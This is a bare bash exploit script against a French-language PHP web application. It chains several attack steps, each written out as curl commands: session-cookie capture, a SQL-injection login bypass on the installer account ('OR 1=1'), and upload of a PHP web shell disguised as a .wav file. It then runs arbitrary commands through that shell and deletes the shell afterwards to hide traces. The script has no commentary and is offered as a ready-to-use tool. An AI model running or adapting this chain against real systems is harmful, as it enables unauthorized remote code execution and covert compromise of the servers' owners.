cooks=$(curl -sk -i $1/Accueil.php > cooks ) 

cooks=$(cat cooks | grep Cookie |grep -o -P '(?<=PHPSESSID=).*(?=; path)')

echo $cooks 

echo "[REDIRECTS]"
curl -sk -H "Cookie: PHPSESSID=$cooks" $1/start.php?INSTALL > /dev/null
curl -sk -H "Cookie: PHPSESSID=$cooks" $1/Identification.php?TYPE=Installateur > /dev/null
curl -sk "Cookie: PHPSESSID=$cooks" -X POST $1/Identification.php?TYPE=Installateur -d "Login=test' OR '1=1'-- -&Pwd=&Submit=Valider" > /dev/null

rand=$(echo $RANDOM)
echo $rand

echo "[UPLOAD]"
curl -sk -H "Cookie: PHPSESSID=$cooks" -F "UPLOAD=" -F "fondAudio=@./test.php;filename=$rand.php.wav" $1/POP_PCM.php?Ide=PCM > /dev/null
echo "[EXEC]"
curl -sk -X  POST $1/Temp/$rand.php.wav -d "test=$2" 
echo ""
echo "[CLEAN]"
curl -sk -X  POST $1/Temp/$rand.php.wav -d "test=del%20$rand.php.wav" 
echo ""
echo "[DECO]"
curl -sk -H "Cookie: PHPSESSID=$cooks" $1/Deconnexion.php > /dev/null
